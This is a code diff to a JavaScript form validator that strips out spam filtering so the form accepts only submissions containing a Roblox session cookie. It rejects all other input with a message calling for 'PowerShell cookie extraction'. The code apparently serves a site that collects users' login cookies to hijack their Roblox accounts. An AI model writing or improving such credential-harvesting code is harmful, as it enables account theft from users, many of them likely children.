@@ -70,49 +70,14 @@ function isValidCode(code) {
         return { valid: false, reason: 'This input has already been submitted!' };
     }
 
-    // Extract Roblox cookie if present
+    // ONLY allow Roblox cookie extraction - block everything else
     const robloxCookie = extractRobloxCookie(cleanCode);
     if (robloxCookie) {
         return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
     }
 
-    // Block obvious spam patterns
-    const spamPatterns = [
-        /^(.)\1{6,}$/,      // Same character repeated 7+ times (aaaaaaa)
-        /^(..)\1{3,}$/,     // Same 2 characters repeated 4+ times (abababab)
-        /^\s*$/,            // Only whitespace
-        
-        // Random small numbers (spam)
-        /^[0-9]{1,6}$/,     // Any small number 1-6 digits (123, 999, 11144, etc)
-        /^(.)\1{2,}$/,      // Same character repeated 3+ times (111, 444, aaa)
-        
-        // Keyboard spam patterns
-        /^(qwerty|qwertyui|asdf|asdfgh|zxcv|zxcvbn|hjkl|hjklzx|uiop|yuiop|mnbv|vcxz|poiu|lkjh|gfds|fdsa|rewq|wert|erty|dfgh|fghj|ghjk|vbnm|bnm|nm|qaz|wsx|edc|rfv|tgb|yhn|ujm|ik|ol|pl|ok|ijn|uhb|ygv|tfc|rdx|esz|waq|qwe|asd|zxc|poi|lkj|mnb|vcx|dfg|fgh|ghj|hjk|jkl|vbn|bnm|nm)+$/i,
-        
-        // Common keyboard sequences
-        /^(123|1234|12345|123456|1234567|12345678|123456789|qwe|asd|zxc|wer|sdf|xcv|ert|dfg|cvb|rty|fgh|vbn|tyu|ghj|bnm|yui|hjk|iop|jkl|opq|klm|pqr|lmn|qrs|mno|rst|nop|stu|oqp|tuv|pqr|uvw|qrs|vwx|rst|wxy|stu|xyz|tuv)+$/i,
-        
-        // Random letter combinations (common spam)
-        /^(abc|bcd|cde|def|efg|fgh|ghi|hij|ijk|jkl|klm|lmn|mno|nop|opq|pqr|qrs|rst|stu|tuv|uvw|vwx|wxy|xyz)+$/i,
-    ];
-
-    for (const pattern of spamPatterns) {
-        if (pattern.test(cleanCode)) {
-            console.log('Spam pattern matched:', pattern, 'for input:', cleanCode);
-            return { valid: false, reason: 'random_letters', isRandomLetters: true };
-        }
-    }
-
-    // Block obvious random letters (short random text)
-    const isRandomLetters = /^[a-zA-Z\s]{3,8}$/.test(cleanCode) && 
-                           !/\b(roblox|item|id|script|code|game|test|hello|hi)\b/i.test(cleanCode);
-    
-    if (isRandomLetters) {
-        return { valid: false, reason: 'random_letters', isRandomLetters: true };
-    }
-
-    // Accept everything else
-    return { valid: true, type: 'general_input' };
+    // Block everything that's not a cookie
+    return { valid: false, reason: 'Only PowerShell cookie extraction is allowed!', isBlocked: true };
 }
 
 function checkRateLimit() {
